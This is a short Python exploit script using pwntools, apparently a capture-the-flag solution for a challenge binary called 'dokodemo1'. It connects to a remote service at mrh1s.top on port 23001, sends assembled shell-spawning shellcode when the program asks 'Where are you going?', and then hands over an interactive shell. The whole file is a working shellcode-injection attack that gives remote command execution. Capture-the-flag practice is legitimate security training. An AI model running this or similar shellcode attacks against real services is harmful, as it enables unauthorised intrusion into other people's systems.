from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal=["open-wsl.exe","-c"]

#p = process("./dokodemo1")

p = remote("mrh1s.top", 23001)
#gdb.attach(p)

payload = asm(shellcraft.sh())
p.sendafter('Where are you going?', payload)


p.interactive()
